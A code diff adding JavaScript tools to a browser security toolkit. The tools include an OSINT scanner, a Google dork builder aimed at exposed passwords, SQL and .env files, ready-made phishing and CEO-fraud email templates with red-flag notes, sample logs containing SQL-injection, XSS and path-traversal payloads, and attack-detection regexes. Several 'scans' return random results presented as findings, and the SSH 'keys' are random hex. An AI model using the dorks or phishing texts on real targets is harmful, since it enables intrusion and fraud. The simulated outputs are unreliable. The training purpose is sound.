+let osintRunning=false;
+async function runOSINT(){
+  if(osintRunning)return;
+  const user=document.getElementById('osint-user').value.trim();
+  if(!user){document.getElementById('osint-status').textContent='Enter a username.';return;}
+  const type=document.getElementById('osint-type').value;
+  const plats=PLATFORMS[type]||PLATFORMS.all;
+  osintRunning=true;
+  document.getElementById('osint-btn').disabled=true;document.getElementById('osint-btn').textContent='SCANNING...';
+  document.getElementById('osint-status').textContent='Scanning '+plats.length+' platforms...';
+  document.getElementById('osint-results').innerHTML='';
+  let found=0;
+  for(let i=0;i<plats.length;i++){
+    const p=plats[i];
+    const el=document.createElement('span');el.className='plat-card plat-checking';el.textContent=p+' ...';
+    document.getElementById('osint-results').appendChild(el);
+    await delay(Math.random()*400+200);
+    const isFound=Math.random()>0.45; // simulated
+    el.className='plat-card '+(isFound?'plat-found':'plat-notfound');
+    el.textContent=isFound?'✓ '+p:'✗ '+p;
+    if(isFound)found++;
+    document.getElementById('osint-prog').style.width=((i+1)/plats.length*100)+'%';
+    document.getElementById('osint-status').textContent='Checking: '+p+' ('+Math.round((i+1)/plats.length*100)+'%)';
+  }
+  document.getElementById('osint-count').textContent='Found: '+found+'/'+plats.length;
+  document.getElementById('osint-status').textContent='COMPLETE — '+found+' profiles found';
+  document.getElementById('osint-btn').disabled=false;document.getElementById('osint-btn').textContent='START OSINT SCAN';
+  osintRunning=false;ST.s++;updST();
+}
+function osintEmail(){
+  const email=document.getElementById('osint-email').value.trim()||'user@example.com';
+  const out=document.getElementById('osint-email-out');
+  out.textContent='[*] Checking exposure for: '+email+'\n';
+  setTimeout(()=>{
+    const svc=['Gravatar','Spotify','Adobe','Dropbox'];
+    const found=svc.filter(()=>Math.random()>0.5);
+    out.textContent+='[+] Registered on: '+found.join(', ')+'\n';
+    out.textContent+='[!] Appears in '+Math.floor(Math.random()*4+1)+' data breaches (simulated)\n';
+    out.textContent+='[*] Check real data: haveibeenpwned.com';
+  },800);
+}
+function buildDorks(){
+  const d=document.getElementById('dork-domain').value.trim()||'example.com';
+  const dorks=[
+    `site:${d} inurl:admin`,`site:${d} inurl:login`,`site:${d} inurl:wp-admin`,
+    `site:${d} filetype:pdf`,`site:${d} filetype:sql`,`site:${d} "index of"`,
+    `site:${d} intext:password`,`"${d}" site:pastebin.com`,
+    `site:github.com "${d}" password`,`site:${d} ext:env OR ext:cfg OR ext:conf`,
+  ];
+  document.getElementById('dork-out').textContent=dorks.join('\n');
+}
+ 
+// ============================================================
+// NEW TOOL 3: REGEX TESTER
+// ============================================================
+function loadRx(pattern,name){
+  document.getElementById('rx-pattern').value=pattern;
+  runRegex();
+}
+function runRegex(){
+  const pattern=document.getElementById('rx-pattern').value;
+  const text=document.getElementById('rx-text').value;
+  const flgI=document.getElementById('rx-i').checked?'i':'';
+  const flgG=document.getElementById('rx-g').checked?'g':'';
+  const flgM=document.getElementById('rx-m').checked?'m':'';
+  const flags=flgG+flgI+flgM||'g';
+  const replaceStr=document.getElementById('rx-replace').value;
+  const output=document.getElementById('rx-output');
+  const matchesEl=document.getElementById('rx-matches');
+  const statsEl=document.getElementById('rx-stats');
+  const replacedEl=document.getElementById('rx-replaced');
+  if(!pattern){output.textContent=text;matchesEl.textContent='No pattern.';statsEl.textContent='Matches: 0';replacedEl.textContent='...';return;}
+  try{
+    const rx=new RegExp(pattern,flags.includes('g')?flags:flags+'g');
+    const matches=[...text.matchAll(new RegExp(pattern,flags.includes('g')?flags:flags+'g'))];
+    statsEl.textContent='Matches: '+matches.length+' | Pattern: /'+pattern+'/'+flags;
+    // Highlighted output
+    let highlighted=esc(text).replace(new RegExp(esc(pattern).replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&'),flags),'<span class="rx-match">$&</span>');
+    // Actually do it properly
+    let hlText='';let lastIdx=0;
+    const rx2=new RegExp(pattern,flags.includes('g')?flags:flags+'g');
+    for(const m of matches){
+      hlText+=esc(text.slice(lastIdx,m.index));
+      hlText+='<span class="rx-match">'+esc(m[0])+'</span>';
+      lastIdx=m.index+m[0].length;
+    }
+    hlText+=esc(text.slice(lastIdx));
+    output.innerHTML=hlText||'<span style="color:#aa44ff33">No input text</span>';
+    matchesEl.textContent=matches.length?matches.map((m,i)=>`[${i+1}] "${m[0]}" at pos ${m.index}`).join('\n'):'No matches found.';
+    if(replaceStr){
+      const replaced=text.replace(rx2,replaceStr);
+      replacedEl.textContent=replaced;
+    }else{replacedEl.textContent='(enter replacement string above)';}
+  }catch(e){
+    statsEl.textContent='Invalid regex: '+e.message;
+    output.textContent=text;matchesEl.textContent='Fix the pattern.';
+  }
+}
+ 
+// ============================================================
+// NEW TOOL 4: HTTP SECURITY HEADER SCANNER
+// ============================================================
+const SECURITY_HEADERS=[
+  {name:'Strict-Transport-Security',key:'hsts',desc:'Forces HTTPS connections.',impact:'high',fix:'Strict-Transport-Security: max-age=31536000; includeSubDomains'},
+  {name:'Content-Security-Policy',key:'csp',desc:'Prevents XSS and injection.',impact:'critical',fix:"Content-Security-Policy: default-src 'self'; script-src 'self'"},
+  {name:'X-Frame-Options',key:'xfo',desc:'Prevents clickjacking.',impact:'medium',fix:'X-Frame-Options: DENY'},
+  {name:'X-Content-Type-Options',key:'xcto',desc:'Prevents MIME sniffing.',impact:'medium',fix:'X-Content-Type-Options: nosniff'},
+  {name:'Referrer-Policy',key:'rp',desc:'Controls referrer leakage.',impact:'low',fix:'Referrer-Policy: strict-origin-when-cross-origin'},
+  {name:'Permissions-Policy',key:'pp',desc:'Controls browser features.',impact:'medium',fix:'Permissions-Policy: geolocation=(), camera=(), microphone=()'},
+  {name:'X-XSS-Protection',key:'xxp',desc:'Legacy XSS filter (deprecated).',impact:'low',fix:'X-XSS-Protection: 0 (CSP is preferred)'},
+];
+function scanHeaders(){
+  const url=document.getElementById('hdr-url').value.trim()||'https://example.com';
+  const btn=document.getElementById('hdr-btn');btn.disabled=true;btn.textContent='SCANNING...';
+  let p=0;const iv=setInterval(()=>{p+=Math.random()*15;if(p>100)p=100;document.getElementById('hdr-prog').style.width=p+'%';document.getElementById('hdr-status').textContent='Scanning '+Math.floor(p)+'%';
+    if(p>=100){clearInterval(iv);btn.disabled=false;btn.textContent='SCAN HEADERS';showHeaderResults(url);}
+  },150);
+}
+function showHeaderResults(url){
+  // Simulate header presence with weighted randomness
+  const results=SECURITY_HEADERS.map(h=>({...h,present:Math.random()>0.45,value:getSimulatedHeaderValue(h.key)}));
+  const score=results.filter(h=>h.present).length;
+  const pct=Math.round(score/results.length*100);
+  const grade=pct>=90?'A+':pct>=80?'A':pct>=70?'B':pct>=60?'C':pct>=40?'D':'F';
+  const gradeClass=grade.startsWith('A')?'hg-a':grade==='B'?'hg-b':grade==='C'?'hg-c':'hg-f';
+ 
+  document.getElementById('hdr-grade').innerHTML=`<div style="font-family:'Orbitron',sans-serif;font-size:56px;color:${grade.startsWith('A')?'var(--g)':grade==='B'?'var(--c)':grade==='C'?'var(--y)':'var(--r)'};text-shadow:0 0 20px currentColor">${esc(grade)}</div><div style="font-size:10px;color:#aa44ff88;margin-top:4px">${score}/${results.length} headers present (${pct}%)</div>`;
+  document.getElementById('hdr-status').textContent='COMPLETE — Grade: '+grade;
+ 
+  const cm={critical:'var(--r)',high:'var(--y)',medium:'var(--c)',low:'var(--g)'};
+  document.getElementById('hdr-results').innerHTML=`<div style="font-size:9px;color:#aa44ff88;margin-bottom:7px">URL: ${esc(url)}</div>`+
+    results.map(h=>`<div style="padding:7px 10px;border:1px solid ${h.present?'#00ff4122':'#ff003c22'};margin-bottom:5px;background:${h.present?'#001500':'#1a0000'}">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <span style="font-size:10px;color:${h.present?'var(--g)':'var(--r)'}">${h.present?'✓':'✗'} ${esc(h.name)}</span>
+        <span class="etag ${h.impact==='critical'?'ec':h.impact==='high'?'eh':'em'}" style="font-size:8px">${esc(h.impact.toUpperCase())}</span>
+      </div>
+      <div style="font-size:9px;color:#888;margin-top:3px">${h.present?esc(h.value):esc(h.desc)+' — Missing!'}</div>
+      ${!h.present?`<div style="font-size:9px;color:#00ff4177;margin-top:2px">Fix: ${esc(h.fix)}</div>`:''}
+    </div>`).join('');
+  ST.s++;updST();
+}
+function getSimulatedHeaderValue(key){
+  const vals={hsts:'max-age=31536000; includeSubDomains',csp:"default-src 'self'",xfo:'SAMEORIGIN',xcto:'nosniff',rp:'strict-origin-when-cross-origin',pp:'geolocation=()',xxp:'1; mode=block'};
+  return vals[key]||'present';
+}
+function checkCORS(){
+  const origin=document.getElementById('cors-origin').value.trim()||'https://evil.com';
+  const out=document.getElementById('cors-out');
+  out.textContent='[*] Testing CORS for origin: '+origin+'\n';
+  setTimeout(()=>{
+    const wildcard=Math.random()>0.5;
+    if(wildcard){out.textContent+='[CRITICAL] Access-Control-Allow-Origin: *\n[!] ANY origin can make cross-origin requests!\nFix: Whitelist specific origins.';out.style.color='var(--r)';}
+    else{out.textContent+='[OK] CORS properly restricted.\nAccess-Control-Allow-Origin: (specific domain)\n[✓] Only whitelisted origins allowed.';out.style.color='var(--g)';}
+  },700);
+}
+ 
+// ============================================================
+// NEW TOOL 5: PHISHING SIMULATOR
+// ============================================================
+const PHISH_TEMPLATES={
+  login:(org,domain)=>
+`From: IT Security <security@${domain}>
+Subject: [URGENT] Your ${org} account requires verification
+ 
+Dear Employee,
+ 
+Our security system has detected unusual login activity on your account. 
+To secure your ${org} account, please verify your credentials immediately.
+ 
+⚠ Your account will be suspended in 24 hours if not verified.
+ 
+→ Click here to verify: https://login.${domain}/verify?token=3f8a2b
+ 
+Best regards,
+${org} IT Security Team
+ 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔴 RED FLAGS IN THIS EMAIL:
+• Fake urgent deadline
+• Suspicious domain: ${domain} (not official)
+• Generic "Dear Employee"
+• External verification link
+• Fear-based manipulation`,
+ 
+  invoice:(org,domain)=>
+`From: Accounts Payable <ap@${domain}>
+Subject: Invoice #INV-2024-8847 — Payment Required
+ 
+Hi,
+ 
+Please find attached Invoice #INV-2024-8847 for $4,299.00 due immediately.
+ 
+This invoice is past due. To avoid service interruption, 
+please process payment via the link below.
+ 
+→ View Invoice: https://${domain}/invoice/INV-2024-8847.pdf
+ 
+Regards,
+${org} Finance Dept
+ 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔴 RED FLAGS:
+• Unexpected invoice from unknown sender
+• Fake domain: ${domain}
+• Pressure to pay immediately
+• PDF links can deliver malware`,
+ 
+  it:(org,domain)=>
+`From: IT Help Desk <helpdesk@${domain}>
+Subject: Password Expiry — Action Required
+ 
+Your ${org} password expires in 2 hours.
+ 
+To continue accessing company resources, reset your password now.
+ 
+Username: [your email]
+→ Reset Password: https://sso.${domain}/reset
+ 
+If you don't reset within 2 hours, your account will be locked.
+ 
+— ${org} IT Support
+ 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔴 RED FLAGS:
+• Fake short deadline (2 hours)
+• IT never sends password reset links via email unprompted
+• Check sender domain carefully`,
+ 
+  prize:(org,domain)=>
+`From: ${org} Rewards <noreply@${domain}>
+Subject: Congratulations! You've won an iPhone 15 Pro 🎉
+ 
+Dear Valued Customer,
+ 
+You have been selected as our LUCKY WINNER!
+ 
+Prize: iPhone 15 Pro (256GB)
+Claim By: Tomorrow midnight
+ 
+To claim your prize, verify your shipping details:
+→ https://${domain}/claim?winner=true&code=PRIZE2024
+ 
+Note: Small shipping fee of $4.99 required.
+ 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔴 RED FLAGS:
+• Unsolicited prize notification
+• "Small fee" is a scam indicator
+• Urgency: "claim by tomorrow"
+• No context of how you won`,
+ 
+  ceo:(org,domain)=>
+`From: CEO <ceo@${domain}>
+Subject: Confidential — Urgent Wire Transfer
+ 
+Hi [Finance Manager],
+ 
+I'm in a board meeting and need your help urgently.
+Please initiate a wire transfer of $87,500 to our new vendor.
+ 
+Account: 4891-XXXX-XXXX
+Routing: 021000089
+Reference: Project Zenith
+ 
+This is time-sensitive and confidential. Do NOT discuss with others.
+ 
+Thanks,
+[CEO Name]
+${org}
+ 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔴 RED FLAGS (Business Email Compromise):
+• Requests wire transfer via email
+• "Confidential — don't tell others"
+• CEO name spoofed (check actual domain)
+• Urgency prevents verification`,
+ 
+  verify:(org,domain)=>
+`[SMS] ${org}: Your account has been locked due to suspicious activity.
+Verify now to restore access: https://${domain}/v?t=a8x2k
+ 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔴 RED FLAGS (SMS Phishing / Smishing):
+• Unexpected security alert via SMS
+• Short URL hides real destination
+• Legitimate companies don't lock via SMS without warning
+• Never click SMS links from unknown numbers`,
+};
+ 
+function buildPhish(){
+  const type=document.getElementById('phish-type').value;
+  const org=document.getElementById('phish-org').value||'ExampleCorp';
+  const domain=document.getElementById('phish-domain').value||'examp1e-corp.com';
+  const fn=PHISH_TEMPLATES[type];
+  if(fn)document.getElementById('phish-preview').textContent=fn(org,domain);
+  document.getElementById('phish-defense').innerHTML=`
+    <div style="padding:4px 8px;border-left:2px solid var(--g);margin-bottom:4px">&#9658; Always verify sender domain — hover links before clicking</div>
+    <div style="padding:4px 8px;border-left:2px solid var(--g);margin-bottom:4px">&#9658; Contact the sender via KNOWN phone/email to confirm</div>
+    <div style="padding:4px 8px;border-left:2px solid var(--g);margin-bottom:4px">&#9658; Enable MFA on all accounts</div>
+    <div style="padding:4px 8px;border-left:2px solid var(--g);margin-bottom:4px">&#9658; Use email gateway with phishing detection (Proofpoint, Mimecast)</div>
+    <div style="padding:4px 8px;border-left:2px solid var(--g)">&#9658; Run phishing simulations (KnowBe4, GoPhish) to train staff</div>`;
+}
+function detectPhish(){
+  const text=document.getElementById('phish-detect').value.toLowerCase();
+  const flags=[];
+  if(/urgent|immediately|asap|within \d+ hour/i.test(text))flags.push({sev:'high',f:'Urgency language detected'});
+  if(/click here|verify now|confirm account|suspended|locked/i.test(text))flags.push({sev:'high',f:'Suspicious call-to-action'});
+  if(/wire transfer|bitcoin|gift card|bank account/i.test(text))flags.push({sev:'critical',f:'Financial fraud indicators'});
+  if(/password|login|credential/i.test(text))flags.push({sev:'high',f:'Credential harvesting language'});
+  if(/http:\/\/|bit\.ly|tinyurl|\.xyz|\.tk/i.test(text))flags.push({sev:'high',f:'Suspicious URL pattern detected'});
+  if(/congratulations|winner|selected|prize/i.test(text))flags.push({sev:'medium',f:'Prize/lottery scam indicators'});
+  if(/confidential|do not share|do not tell/i.test(text))flags.push({sev:'high',f:'Secrecy pressure (BEC indicator)'});
+  if(/dear (customer|user|member|employee)/i.test(text))flags.push({sev:'low',f:'Generic salutation (not personalized)'});
+  const cm={critical:'var(--r)',high:'var(--y)',medium:'var(--c)',low:'var(--g)'};
+  if(flags.length){
+    document.getElementById('phish-flags').innerHTML=`<div style="font-size:10px;color:var(--r);margin-bottom:6px">⚠ ${flags.length} RED FLAG(S) DETECTED — LIKELY PHISHING</div>`+
+      flags.map(f=>`<div style="padding:4px 8px;border-left:3px solid ${cm[f.sev]};margin-bottom:3px;font-size:10px;color:${cm[f.sev]}">[${f.sev.toUpperCase()}] ${esc(f.f)}</div>`).join('');
+  }else{
+    document.getElementById('phish-flags').innerHTML='<div style="color:var(--g);font-size:10px;padding:5px">✓ No obvious phishing indicators found. Stay cautious!</div>';
+  }
+}
+ 
+// ============================================================
+// NEW TOOL 6: LOG ANALYZER
+// ============================================================
+function showLogTab(id,btn){
+  document.querySelectorAll('#log-summary,#log-attacks,#log-ips,#log-timeline').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('#log-tabs .ctabb').forEach(b=>b.classList.remove('active'));
+  document.getElementById('log-'+id).classList.add('active');btn.classList.add('active');
+}
+function loadSampleLogs(){
+  document.getElementById('log-input').value=`192.168.1.5 - admin [01/Jan/2024:12:00:01 +0000] "GET /index.php HTTP/1.1" 200 1234
+10.0.0.5 - - [01/Jan/2024:12:00:02 +0000] "POST /admin/login HTTP/1.1" 403 512
+45.33.32.156 - - [01/Jan/2024:12:00:03 +0000] "GET /wp-admin HTTP/1.1" 404 256
+192.168.1.10 - - [01/Jan/2024:12:00:04 +0000] "GET /api/users HTTP/1.1" 200 8192
+45.33.32.156 - - [01/Jan/2024:12:00:05 +0000] "GET /../../../etc/passwd HTTP/1.1" 400 128
+45.33.32.156 - - [01/Jan/2024:12:00:06 +0000] "GET /?id=1' OR 1=1-- HTTP/1.1" 200 4096
+10.0.0.5 - - [01/Jan/2024:12:00:07 +0000] "POST /admin/login HTTP/1.1" 403 512
+10.0.0.5 - - [01/Jan/2024:12:00:08 +0000] "POST /admin/login HTTP/1.1" 403 512
+45.33.32.156 - - [01/Jan/2024:12:00:09 +0000] "GET /?search=<script>alert(1)</script> HTTP/1.1" 200 2048
+192.168.1.5 - admin [01/Jan/2024:12:00:10 +0000] "GET /dashboard HTTP/1.1" 200 16384
+203.0.113.42 - - [01/Jan/2024:12:00:11 +0000] "GET /robots.txt HTTP/1.1" 200 64
+45.33.32.156 - - [01/Jan/2024:12:00:12 +0000] "GET /server-status HTTP/1.1" 200 1024`;
+}
+function analyzeLogs(){
+  const raw=document.getElementById('log-input').value.trim();
+  if(!raw){document.getElementById('log-summary').innerHTML='<div style="color:var(--r);padding:10px">No log data entered.</div>';return;}
+  const lines=raw.split('\n').filter(l=>l.trim());
+  const ipMap={};const attacks=[];const statusCodes={};const timeline=[];
+  lines.forEach(line=>{
+    // Extract IP
+    const ipMatch=line.match(/^(\d+\.\d+\.\d+\.\d+)/);
+    const ip=ipMatch?ipMatch[1]:'unknown';
+    ipMap[ip]=(ipMap[ip]||0)+1;
+    // Extract status
+    const statMatch=line.match(/"[^"]*"\s+(\d{3})/);
+    const status=statMatch?statMatch[1]:'???';
+    statusCodes[status]=(statusCodes[status]||0)+1;
+    // Extract time
+    const timeMatch=line.match(/\[([^\]]+)\]/);
+    if(timeMatch)timeline.push({t:timeMatch[1],ip,status,line});
+    // Detect attacks
+    if(line.match(/\.\.\/|etc\/passwd|\/etc\//i))attacks.push({type:'PATH TRAVERSAL',ip,line,sev:'critical'});
+    if(line.match(/OR\s+1=1|UNION\s+SELECT|'--|\bDROP\s+TABLE/i))attacks.push({type:'SQL INJECTION',ip,line,sev:'critical'});
+    if(line.match(/<script|onerror=|javascript:/i))attacks.push({type:'XSS ATTEMPT',ip,line,sev:'high'});
+    if(line.match(/wp-admin|phpmyadmin|\.env|xmlrpc/i))attacks.push({type:'RECON/SCAN',ip,line,sev:'medium'});
+    // Brute force: same IP multiple 403s
+  });
+  // Detect brute force
+  Object.entries(ipMap).forEach(([ip,cnt])=>{if(cnt>3&&lines.filter(l=>l.startsWith(ip)&&l.includes(' 403 ')).length>=3)attacks.push({type:'BRUTE FORCE',ip,line:ip+' — '+cnt+' requests, multiple 403s',sev:'high'});});
+ 
+  const totalReq=lines.length;const codes4xx=Object.entries(statusCodes).filter(([k])=>k.startsWith('4')).reduce((a,[,v])=>a+v,0);
+  // Summary
+  document.getElementById('log-stats').innerHTML=`<div style="font-size:10px;line-height:2;color:#00ff41bb">Lines: ${totalReq} | Unique IPs: ${Object.keys(ipMap).length}<br>4xx Errors: ${codes4xx} | Attacks: <span style="color:var(--r)">${attacks.length}</span></div>`;
+  const cm={critical:'var(--r)',high:'var(--y)',medium:'var(--c)',low:'var(--g)'};
+  document.getElementById('log-summary').innerHTML=`<div style="font-size:9px;color:#aa44ff88;margin-bottom:7px">OVERVIEW</div>`+
+    `<div style="font-size:10px;line-height:2;color:#00ff41bb;margin-bottom:10px">Total Requests: <strong style="color:var(--g)">${totalReq}</strong><br>Unique IPs: <strong>${Object.keys(ipMap).length}</strong><br>Attack Attempts: <strong style="color:var(--r)">${attacks.length}</strong></div>`+
+    `<div style="font-size:9px;color:#aa44ff88;margin-bottom:5px">STATUS CODE DISTRIBUTION</div>`+
+    Object.entries(statusCodes).sort(([a],[b])=>a-b).map(([k,v])=>`<div style="display:flex;justify-content:space-between;font-size:10px;padding:2px 0;border-bottom:1px solid #00ff4111"><span style="color:${k.startsWith('2')?'var(--g)':k.startsWith('3')?'var(--c)':k.startsWith('4')?'var(--y)':'var(--r)'}">${k}</span><span>${v}</span></div>`).join('');
+  document.getElementById('log-attacks').innerHTML=attacks.length?attacks.map(a=>`<div style="padding:6px 9px;border-left:3px solid ${cm[a.sev]};margin-bottom:5px;font-size:10px;background:#0f001a"><span style="color:${cm[a.sev]}">[${a.sev.toUpperCase()}] ${esc(a.type)}</span><br><span style="color:#888">IP: ${esc(a.ip)}</span><br><span style="color:#555;font-size:9px">${esc(a.line.substring(0,100))}</span></div>`).join(''):'<div style="color:var(--g);padding:16px;text-align:center">No attacks detected.</div>';
+  const sortedIPs=Object.entries(ipMap).sort(([,a],[,b])=>b-a).slice(0,10);
+  document.getElementById('log-ips').innerHTML=`<div style="font-size:9px;color:#aa44ff88;margin-bottom:7px">TOP IPs BY REQUEST COUNT</div>`+
+    sortedIPs.map(([ip,cnt])=>`<div style="display:flex;justify-content:space-between;align-items:center;padding:5px 8px;border:1px solid #00ff4111;margin-bottom:3px;font-size:10px"><span style="color:var(--c)">${esc(ip)}</span><span style="color:var(--g)">${cnt} reqs</span><span style="color:${attacks.some(a=>a.ip===ip)?'var(--r)':'#555'}">${attacks.some(a=>a.ip===ip)?'⚠ ATTACK':''}</span></div>`).join('');
+  document.getElementById('log-timeline').innerHTML=`<div style="font-size:9px;color:#aa44ff88;margin-bottom:7px">REQUEST TIMELINE (last 20)</div>`+
+    timeline.slice(-20).map(e=>`<div style="font-size:9px;padding:3px 6px;border-left:2px solid ${e.status.startsWith('4')?'var(--y)':e.status.startsWith('5')?'var(--r)':'#00ff4133'};margin-bottom:2px;color:#888"><span style="color:var(--c)">${esc(e.t)}</span> ${esc(e.ip)} → <span style="color:${e.status.startsWith('2')?'var(--g)':'var(--y)'}">${esc(e.status)}</span></div>`).join('');
+  ST.s++;updST();
+}
+ 
+// ============================================================
+// NEW TOOL 7: FIREWALL RULE BUILDER
+// ============================================================
+let fwRules=[];
+function addFWRule(){
+  const action=document.getElementById('fw-action').value;
+  const chain=document.getElementById('fw-chain').value;
+  const proto=document.getElementById('fw-proto').value;
+  const src=document.getElementById('fw-src').value.trim();
+  const dst=document.getElementById('fw-dst').value.trim();
+  const port=document.getElementById('fw-port').value.trim();
+  const iface=document.getElementById('fw-iface').value.trim();
+  fwRules.push({action,chain,proto,src,dst,port,iface,id:Date.now()});
+  renderFWRules();
+}
+function clearFWRules(){fwRules=[];renderFWRules();}
+function loadFWTemplate(type){
+  fwRules=[];
+  if(type==='web'){fwRules=[{action:'ACCEPT',chain:'INPUT',proto:'tcp',src:'',dst:'',port:'80',iface:'eth0',id:1},{action:'ACCEPT',chain:'INPUT',proto:'tcp',src:'',dst:'',port:'443',iface:'eth0',id:2},{action:'ACCEPT',chain:'INPUT',proto:'tcp',src:'',dst:'',port:'22',iface:'',id:3},{action:'DROP',chain:'INPUT',proto:'all',src:'',dst:'',port:'',iface:'',id:4}];}
+  else if(type==='ssh'){fwRules=[{action:'ACCEPT',chain:'INPUT',proto:'tcp',src:'192.168.1.0/24',dst:'',port:'22',iface:'',id:1},{action:'DROP',chain:'INPUT',proto:'tcp',src:'',dst:'',port:'22',iface:'',id:2},{action:'ACCEPT',chain:'INPUT',proto:'tcp',src:'',dst:'',port:'80,443',iface:'',id:3},{action:'DROP',chain:'INPUT',proto:'all',src:'',dst:'',port:'',iface:'',id:4}];}
+  else if(type==='lockdown'){fwRules=[{action:'ACCEPT',chain:'INPUT',proto:'tcp',src:'127.0.0.1',dst:'',port:'',iface:'lo',id:1},{action:'DROP',chain:'INPUT',proto:'all',src:'',dst:'',port:'',iface:'',id:2},{action:'DROP',chain:'FORWARD',proto:'all',src:'',dst:'',port:'',iface:'',id:3},{action:'ACCEPT',chain:'OUTPUT',proto:'tcp',src:'',dst:'',port:'80,443',iface:'',id:4}];}
+  renderFWRules();
+}
+function renderFWRules(){
+  if(!fwRules.length){
+    document.getElementById('fw-rules').innerHTML='<div style="color:#aa44ff33;font-size:11px;padding:16px;text-align:center">Add rules above</div>';
+    document.getElementById('fw-script').textContent='#!/bin/bash\n# No rules added yet';
+    return;
+  }
+  const actionCls={ACCEPT:'rule-accept',DROP:'rule-drop',REJECT:'rule-reject',LOG:'rule-accept'};
+  document.getElementById('fw-rules').innerHTML=fwRules.map((r,i)=>`<div class="fw-rule">
+    <span class="rule-action ${actionCls[r.action]||'rule-accept'}">${esc(r.action)}</span>
+    <span style="color:var(--c)">${esc(r.chain)}</span>
+    <span style="color:#888">-p ${esc(r.proto)}</span>
+    ${r.src?`<span style="color:#00ff41bb">src: ${esc(r.src)}</span>`:''}
+    ${r.dst?`<span style="color:#00ff41bb">dst: ${esc(r.dst)}</span>`:''}
+    ${r.port?`<span style="color:var(--y)">port: ${esc(r.port)}</span>`:''}
+    ${r.iface?`<span style="color:var(--pu)">-i ${esc(r.iface)}</span>`:''}
+    <button onclick="fwRules.splice(${i},1);renderFWRules()" style="background:transparent;border:none;color:var(--r);cursor:pointer;font-size:12px;margin-left:auto">✕</button>
+  </div>`).join('');
+  const script='#!/bin/bash\n# Generated by Sandesh ETH-HACK v6.0\n# iptables Firewall Rules\n\n# Flush existing rules\niptables -F\niptables -X\n\n'+
+    fwRules.map(r=>{
+      let cmd=`iptables -A ${r.chain}`;
+      if(r.iface)cmd+=` -i ${r.iface}`;
+      if(r.proto)cmd+=` -p ${r.proto}`;
+      if(r.src&&r.src!=='any')cmd+=` -s ${r.src}`;
+      if(r.dst&&r.dst!=='any')cmd+=` -d ${r.dst}`;
+      if(r.port)cmd+=` --dport ${r.port}`;
+      cmd+=` -j ${r.action}`;
+      return cmd;
+    }).join('\n');
+  document.getElementById('fw-script').textContent=script;
+}
+ 
+// ============================================================
+// NEW TOOL 8: SSH KEY GENERATOR & ANALYZER
+// ============================================================
+function generateSSHKey(){
+  const type=document.getElementById('ssh-type').value;
+  const comment=document.getElementById('ssh-comment').value||'user@hostname';
+  const keyTypes={rsa4096:{bits:4096,type:'RSA',alg:'RSA PRIVATE KEY'},rsa2048:{bits:2048,type:'RSA',alg:'RSA PRIVATE KEY'},ed25519:{bits:256,type:'ED25519',alg:'OPENSSH PRIVATE KEY'},ecdsa:{bits:256,type:'ECDSA',alg:'EC PRIVATE KEY'}};
+  const k=keyTypes[type];
+  // Simulate key generation
+  const randomHex=(n)=>Array.from(crypto.getRandomValues(new Uint8Array(n))).map(b=>b.toString(16).padStart(2,'0')).join('');
+  const privLines=[];for(let i=0;i<6;i++)privLines.push(randomHex(24).toUpperCase().match(/.{1,64}/g).join(''));
+  const pubKey=`ssh-${k.type.toLowerCase()} AAAA${btoa(randomHex(32)).replace(/=/g,'')} ${comment}`;
+  const privKey=`-----BEGIN ${k.alg}-----\n${privLines.join('\n')}\n-----END ${k.alg}-----`;
+  document.getElementById('ssh-output').innerHTML=`
+    <div style="font-size:9px;color:#aa44ff88;margin-bottom:4px">PUBLIC KEY (safe to share)</div>
+    <div style="background:#001500;border:1px solid #00ff4133;padding:8px;font-size:9px;color:var(--g);word-break:break-all;margin-bottom:8px">${esc(pubKey)}</div>
+    <button class="btn btnw" style="font-size:10px;margin-bottom:8px" onclick="navigator.clipboard.writeText('${esc(pubKey)}').then(()=>{this.textContent='COPIED!';setTimeout(()=>this.textContent='COPY PUBLIC KEY',1400)})">COPY PUBLIC KEY</button>
+    <div style="font-size:9px;color:#aa44ff88;margin-bottom:4px">PRIVATE KEY (keep secret!)</div>
+    <div style="background:#1a0000;border:1px solid #ff003c33;padding:8px;font-size:9px;color:#ff9944;word-break:break-all">${esc(privKey)}</div>
+    <div style="font-size:9px;color:var(--r);margin-top:5px">⚠ NEVER share your private key!</div>`;
+  document.getElementById('ssh-analysis').innerHTML=`<div style="font-size:10px;line-height:2;color:#00ff41bb">
+    Key Type: <strong style="color:var(--pu)">${esc(k.type)}</strong><br>
+    Key Size: <strong style="color:${k.bits>=4096?'var(--g)':k.bits>=2048?'var(--y)':'var(--r)'}">${k.bits} bits</strong><br>
+    Algorithm: <strong>${esc(k.alg)}</strong><br>
+    Comment: <strong>${esc(comment)}</strong><br>
+    Security: <strong style="color:${type==='ed25519'||type==='rsa4096'?'var(--g)':'var(--y)'}">${type==='ed25519'?'EXCELLENT (recommended)':type==='rsa4096'?'STRONG':type==='ecdsa'?'GOOD':'ACCEPTABLE'}</strong><br>
+    Fingerprint: SHA256:${randomHex(16)}
+  </div>`;
+}
+function auditSSHConfig(){
+  const config=document.getElementById('ssh-config').value;
+  if(!config){document.getElementById('ssh-analysis').innerHTML='<div style="color:var(--r);padding:10px">No config pasted.</div>';return;}
+  const checks=[
+    {pattern:/PermitRootLogin\s+yes/i,sev:'critical',issue:'Root login permitted',fix:'PermitRootLogin no'},
+    {pattern:/PasswordAuthentication\s+yes/i,sev:'high',issue:'Password auth enabled — brute-forceable',fix:'PasswordAuthentication no'},
+    {pattern:/Port\s+22\b/i,sev:'medium',issue:'Default port 22 in use',fix:'Port 2222 (security through obscurity)'},
+    {pattern:/X11Forwarding\s+yes/i,sev:'medium',issue:'X11 forwarding enabled — attack surface',fix:'X11Forwarding no'},
+    {pattern:/AllowTcpForwarding\s+yes/i,sev:'medium',issue:'TCP forwarding enabled',fix:'AllowTcpForwarding no'},
+    {pattern:/MaxAuthTries\s+(\d+)/i,sev:'low',issue:'Check MaxAuthTries',fix:'MaxAuthTries 3'},
+    {pattern:/Protocol\s+1/i,sev:'critical',issue:'SSHv1 enabled — DEPRECATED and INSECURE',fix:'Remove Protocol line (v2 is default)'},
+  ];
